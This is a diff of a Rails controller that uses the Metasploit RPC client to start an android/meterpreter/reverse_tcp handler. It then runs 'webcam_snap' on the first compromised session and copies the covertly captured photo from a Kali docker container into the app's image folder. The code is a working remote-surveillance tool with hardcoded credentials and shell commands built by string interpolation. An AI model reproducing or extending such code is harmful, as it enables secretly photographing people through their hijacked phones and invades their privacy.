@@ -37,31 +37,47 @@ class PicturesController < InheritedResources::Base
 
         user = 'cool'
         pass = 'looc'
-
+        
         opts = {
-        host: '127.0.0.1',
-        port: 3333,
-        uri:  '/api/',
-        ssl:  true
+          host: '127.0.0.1',
+          port: 3333,
+          uri:  '/api/',
+          ssl:  true
         }
         rpc = Msf::RPC::Client.new(opts)
         rpc.login(user, pass)
-
-        pay_opts = {
-        'PAYLOAD' => 'android/meterpreter/reverse_tcp',
-        'LHOST'   => '0.0.0.0',
-        'LPORT'   => 4444
+        
+        opts = {
+          host: '127.0.0.1',
+          port: 3333,
+          uri:  '/api/',
+          ssl:  true
         }
-
-
-        puts rpc.call('session.meterpreter_write', 5, "webcam_snap -p lol2.jpeg -q 100 -i 2")
-        puts rpc.call('session.meterpreter_read', 5)
-        copyPictureCommand="docker cp kali_container:/lol.png files\\pictures\\lol.png"
-        system(copyPictureCommand)
-
-        respond_to do |format|
-            format.js
+        
+        pay_opts = {
+          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
+          'LHOST'   => '0.0.0.0',
+          'LPORT'   => 4444
+        }
+        job = rpc.call('module.execute', 'exploit', 'multi/handler', pay_opts)
+        
+        session=rpc.call('session.list').keys[0]
+        require 'date'
+        current_time = DateTime.now
+        @file_name= "picture_" + current_time.strftime("%d_%m_%Y_%H_%M_%S") + '.jpeg'
+        puts @file_name
+        puts rpc.call('session.meterpreter_write', session, "webcam_snap -q 100 -i 1 -p #{@file_name}")
+        sleep 2
+        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
+        while not system("docker exec kali_container ls | grep #{@file_name}") do
+            puts "Waiting ..."
         end
+        copyPictureCommand="docker cp kali_container:/#{@file_name} app\\assets\\images\\files\\pictures\\#{@file_name}"
+        system(copyPictureCommand)
+        puts @file_name
+        respond_to do |format|
+            format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @file_name}  }
+          end
 
 
     end
